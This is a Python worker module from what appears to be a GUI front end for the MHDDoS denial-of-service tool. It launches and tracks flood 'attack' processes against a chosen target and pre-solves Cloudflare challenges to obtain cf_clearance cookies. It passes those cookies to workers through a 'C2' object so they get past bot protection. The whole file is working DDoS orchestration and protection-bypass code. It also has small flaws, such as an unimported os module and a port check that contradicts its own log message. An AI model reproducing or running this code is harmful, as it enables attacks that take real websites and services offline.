# src/worker/service.py
from __future__ import annotations

import asyncio
import logging
import re
import subprocess
import sys
import time
import json as _json
from typing import Any, Protocol, Optional

class StreamReaderLike(Protocol):
    async def read(self, n: int = -1) -> bytes: ...

class ProcessLike(Protocol):
    @property
    def stdout(self) -> StreamReaderLike | None: ...
    @property
    def returncode(self) -> int | None: ...
    async def wait(self) -> int: ...


from src.core.state_manager import state_manager, AttackStatus
from src.api.ws_manager import ws_manager, WSMessage

logger = logging.getLogger("mhddos_gui.worker")


class TokenBucketRateLimiter:
    def __init__(self, rate: float = 100.0, capacity: int = 100):
        self.rate = rate
        self.capacity = capacity
        self.tokens = float(capacity)
        self.last_update = time.monotonic()
        self.active_workers_scale = 1.0
        self.current_jitter_delay = 0.0
        self._lock = asyncio.Lock()

    async def calculate_backoff(self, cpu_pct: float, ram_pct: float) -> float:
        """
        Calculates graceful jitter delay under host pressure without dropping workers.
        """
        if cpu_pct > 85.0 or ram_pct > 80.0:
            # Add dynamic jitter backoff instead of terminating threads
            self.current_jitter_delay = min(self.current_jitter_delay + 0.05, 0.50)
        elif cpu_pct < 60.0 and ram_pct < 70.0:
            self.current_jitter_delay = max(self.current_jitter_delay - 0.02, 0.0)
            
        if self.current_jitter_delay > 0:
            await asyncio.sleep(self.current_jitter_delay)
        return self.current_jitter_delay

    async def acquire(self) -> None:
        async with self._lock:
            now = time.monotonic()
            elapsed = now - self.last_update
            self.last_update = now
            self.tokens = min(float(self.capacity), self.tokens + elapsed * self.rate)
            
            if self.tokens < 1.0:
                wait_time = (1.0 - self.tokens) / self.rate
                self.tokens -= 1.0
            else:
                self.tokens -= 1.0
                wait_time = 0.0
                
        if wait_time > 0.0:
            await asyncio.sleep(wait_time)


class WorkerService:
    """Manages background MHDDoS CLI process execution and syncs state to StateManager and WebSocket."""

    def __init__(self) -> None:
        self._active_processes: dict[str, asyncio.subprocess.Process] = {}
        self._active_tasks_info: dict[str, dict] = {}
        self._monitor_tasks: dict[str, asyncio.Task[None]] = {}
        self._lock = asyncio.Lock()
        self._active_tasks: set[asyncio.Task[Any]] = set()

    async def _check_tier0_readiness(self, method: str) -> bool:
        """Check if FlareSolverr (port 8191) is reachable. Returns False if not, but this is non-fatal —
        the engine will automatically fall back to Tier 1-4 bypass methods."""
        if method.upper() not in {"CFB", "CFBUAM", "BYPASS"}:
            return True
        try:
            target_port = int(os.getenv("PORT", "8180"))
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection("127.0.0.1", target_port),
                timeout=1.5
            )
            close_res = writer.close()
            import inspect
            if inspect.isawaitable(close_res):
                await close_res
            await writer.wait_closed()
            return True
        except Exception:
            return False

    async def start_attack(
        self,
        target: str,
        duration: int,
        threads: int,
        method: str = "GET",
        rpc: int = 100,
        *,
        attack_id: str | None = None,
        cmd_args: list[str] | None = None,
        log_callback: Any | None = None,
    ) -> str:
        import uuid
        if not attack_id:
            attack_id = str(uuid.uuid4())[:8]
        # ── Phase 0: Pre-fetch cf_clearance via local IP ──────────────────────
        if cmd_args is None:
            pre_cookie, pre_ua = await self._prefetch_cf_cookie(target, method)
            if pre_cookie:
                from src.app.main import C2
                C2.shared_cf_cookie = pre_cookie
                C2.shared_cf_ua = pre_ua or ""
                logger.info("[Phase 0] Cookie pre-loaded → workers receive via --shared-cookie")
        # ──────────────────────────────────────────────────────────────────────

        async with self._lock:
            if attack_id in self._active_processes:
                raise RuntimeError(f"Task {attack_id} is already running.")

            # Non-fatal FlareSolverr check: warn but allow engine's Tier 1-4 fallback to handle it
            if not await self._check_tier0_readiness(method):
                logger.warning(
                    "Tier 0 FlareSolverr unreachable on localhost:8191. "
                    "Engine will use Tier 1-4 bypass fallback cascade."
                )

            cmd = cmd_args if cmd_args is not None else [
                sys.executable, "-m", "mhddos_gui.cli",
                "--target", target,
                "--duration", str(duration),
                "--threads", str(threads),
                "--method", method,
                "--rpc", str(rpc)
            ]
            logger.info(f"Starting attack process [{attack_id}]: {' '.join(cmd)}")

            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
                self._active_processes[attack_id] = proc
                self._active_tasks_info[attack_id] = {
                    "task_id": attack_id,
                    "target": target,
                    "method": method,
                    "threads": threads,
                    "duration": duration,
                    "rpc": rpc
                }
            except Exception as exc:
                logger.error(f"Failed to spawn attack process: {exc}")
                await state_manager.update_status(AttackStatus.ERROR, str(exc))
                await self._broadcast_state()
                raise

            await state_manager.set_attack_params(
                target=target,
                duration=duration,
                threads=threads,
                method=method,
                rpc=rpc,
            )
            await state_manager.transition(
                AttackStatus.RUNNING,
                attack_id=attack_id,
                target=target,
                method=method,
            )
            await self._broadcast_state()

            self._monitor_tasks[attack_id] = asyncio.create_task(self._monitor_process(attack_id, proc, log_callback))
            return attack_id

    async def _prefetch_cf_cookie(
        self, target: str, method: str
    ) -> tuple[str | None, str | None]:
        """Phase 0: solve Cloudflare challenge via local IP (no proxy).

        Returns (cookie, ua) on success, (None, None) otherwise — always non-fatal.
        Only runs for CF-bypass methods: CFB, CFBUAM, BYPASS.
        """
        if method.upper() not in {"CFB", "CFBUAM", "BYPASS"}:
            return None, None
        try:
            from src.core.engine import BrowserEngine
            logger.info("[Phase 0] Solving CF via local IP (no proxy)...")
            cookie, ua = await asyncio.wait_for(
                BrowserEngine.solve_cf(target, proxy=None),
                timeout=60.0,
            )
            if cookie and "cf_clearance" in cookie:
                logger.info("[Phase 0] ✅ Got cf_clearance via local IP")
                return cookie, ua
            logger.info("[Phase 0] No cf_clearance in result — skipping pre-fetch")
            return None, None
        except asyncio.TimeoutError:
            logger.warning("[Phase 0] Timeout (60s) — workers will self-solve")
            return None, None
        except Exception as exc:
            logger.warning(f"[Phase 0] Error: {exc} — skipping")
            return None, None

    async def _handle_sync_bypass_line(self, line: str) -> None:
        """Parse __SYNC_BYPASS__||<json> stdout signal from worker process.

        Updates C2.shared_cf_cookie / C2.shared_cf_ua so subsequent workers
        injected via build_attack_command() receive the fresh token.
        """
        PREFIX = "__SYNC_BYPASS__||"
        if not line.startswith(PREFIX):
            return
        try:
            from src.app.main import C2
            data = _json.loads(line[len(PREFIX):])
            cookie: str = data.get("cookie", "")
            ua: str = data.get("ua", "")
            if cookie and "cf_clearance" in cookie:
                C2.shared_cf_cookie = cookie
                C2.shared_cf_ua = ua
                logger.info("[C2] ✅ cf_clearance synced from worker → C2 updated")
        except Exception as exc:
            logger.debug(f"[C2] __SYNC_BYPASS__ parse error: {exc}")

    async def stop_attack(self, task_id: str | None = None) -> None:
        async with self._lock:
            tasks_to_stop = [task_id] if task_id else list(self._active_processes.keys())
            
            for tid in tasks_to_stop:
                proc = self._active_processes.get(tid)
                if proc is None or proc.returncode is not None:
                    continue

                logger.info(f"Terminating attack process tree (Task {tid}, PID: {proc.pid})...")
                await self._terminate_process_tree(proc.pid)
                
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except asyncio.TimeoutError:
                    logger.warning(f"Process {tid} did not exit in time after termination command.")
                
                self._active_processes.pop(tid, None)
                self._active_tasks_info.pop(tid, None)

                monitor = self._monitor_tasks.pop(tid, None)
                if monitor and not monitor.done():
                    monitor.cancel()
                    try:
                        await monitor
                    except asyncio.CancelledError:
                        pass

        if not self._active_processes:
            await state_manager.update_status(AttackStatus.STOPPED)
            await self._broadcast_state()

    async def _monitor_process(self, attack_id: str, proc: ProcessLike, log_callback: Any | None = None) -> None:
        """Monitor process stdout using buffered reading and sequential Queue-based logging."""
        queue: asyncio.Queue[str] = asyncio.Queue()

        async def log_consumer() -> None:
            """Consume logs sequentially from queue to guarantee order."""
            while True:
                line = await queue.get()
                try:
                    if line.startswith("__SYNC_BYPASS__||"):
                        await self._handle_sync_bypass_line(line)
                        continue

                    if log_callback:
                        if asyncio.iscoroutinefunction(log_callback):
                            await log_callback(line)
                        else:
                            log_callback(line)
                except Exception as e:
                    logger.debug(f"Error in log_consumer: {e}")
                finally:
                    queue.task_done()

        # Start consumer task and store strong reference
        consumer_task = asyncio.create_task(log_consumer())
        self._active_tasks.add(consumer_task)
        consumer_task.add_done_callback(self._active_tasks.discard)

        try:
            if proc.stdout and hasattr(proc.stdout, "read"):
                buffer = b""
                while True:
                    try:
                        chunk = await proc.stdout.read(8192)
                    except Exception:
                        break
                    if not chunk or not isinstance(chunk, bytes):
                        if buffer:
                            for line in re.split(b"[\r\n]+", buffer):
                                decoded = line.decode("utf-8", errors="replace").strip()
                                if decoded:
                                    await queue.put(decoded)
                        break
                    buffer += chunk
                    if b"\n" in buffer or b"\r" in buffer:
                        parts = re.split(b"[\r\n]+", buffer)
                        for line in parts[:-1]:
                            decoded = line.decode("utf-8", errors="replace").strip()
                            if decoded:
                                await queue.put(decoded)
                        buffer = parts[-1]

            # Ensure all log items are consumed before finishing
            await queue.join()

            returncode = await proc.wait()
            async with self._lock:
                self._active_processes.pop(attack_id, None)
                self._active_tasks_info.pop(attack_id, None)
                self._monitor_tasks.pop(attack_id, None)
            
            if returncode == 0:
                logger.info(f"Attack process {attack_id} completed successfully.")
            else:
                logger.error(f"Attack process {attack_id} exited with unexpected code {returncode}.")
            
            if not self._active_processes:
                await state_manager.update_status(AttackStatus.COMPLETED if returncode == 0 else AttackStatus.ERROR)
            
            await self._broadcast_state()
        except asyncio.CancelledError:
            logger.debug(f"Process monitor task {attack_id} cancelled.")
        except Exception as exc:
            logger.exception(f"Error monitoring attack process {attack_id}: {exc}")
        finally:
            consumer_task.cancel()
            try:
                await consumer_task
            except asyncio.CancelledError:
                pass

    def get_active_tasks(self) -> list[dict]:
        """Returns metadata for all currently running tasks."""
        return list(self._active_tasks_info.values())

    async def _terminate_process_tree(self, target: Any) -> None:
        """Robust multi-layer process tree termination using taskkill (first on Windows), psutil, and process handles."""
        pid = None
        proc = None
        if isinstance(target, int):
            pid = target
            # Attempt to find the proc by matching pid in active processes
            for p in self._active_processes.values():
                if getattr(p, "pid", None) == pid:
                    proc = p
                    break
        elif hasattr(target, "pid"):
            proc = target
            pid = getattr(target, "pid", None)

        if not pid:
            return

        # Layer 1 (Windows-first): Execute taskkill /F /T while parent PID graph is intact
        if sys.platform == "win32":
            try:
                kill_proc = await asyncio.create_subprocess_exec(
                    "taskkill", "/F", "/T", "/PID", str(pid),
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.wait_for(kill_proc.wait(), timeout=5.0)
            except Exception as exc:
                logger.debug(f"taskkill note for PID {pid}: {exc}")
        else:
            try:
                import os
                import signal
                os.killpg(os.getpgid(pid), signal.SIGTERM)
                os.killpg(os.getpgid(pid), signal.SIGKILL)
            except Exception as exc:
                logger.debug(f"POSIX process group kill note for PID {pid}: {exc}")

        # Layer 2: psutil recursive child & parent cleanup for any remaining survivors
        try:
            import psutil
            parent = psutil.Process(pid)
            children = parent.children(recursive=True)
            for child in children:
                try:
                    child.kill()
                except Exception:
                    pass
            try:
                parent.kill()
            except Exception:
                pass
        except Exception as exc:
            logger.debug(f"psutil tree kill note for PID {pid}: {exc}")

        # Layer 3: Direct asyncio.subprocess.Process handle termination
        if proc is not None:
            try:
                if hasattr(proc, "terminate"):
                    res = proc.terminate()
                    if asyncio.iscoroutine(res):
                        await res
            except Exception:
                pass
            try:
                if hasattr(proc, "kill"):
                    res = proc.kill()
                    if asyncio.iscoroutine(res):
                        await res
            except Exception:
                pass

    async def terminate_process_tree(self, target: Any) -> None:
        """Alias for _terminate_process_tree."""
        await self._terminate_process_tree(target)

    async def _broadcast_state(self) -> None:
        state = await state_manager.get_state()
        await ws_manager.broadcast(WSMessage(type="state_update", payload=state))


worker_service = WorkerService()
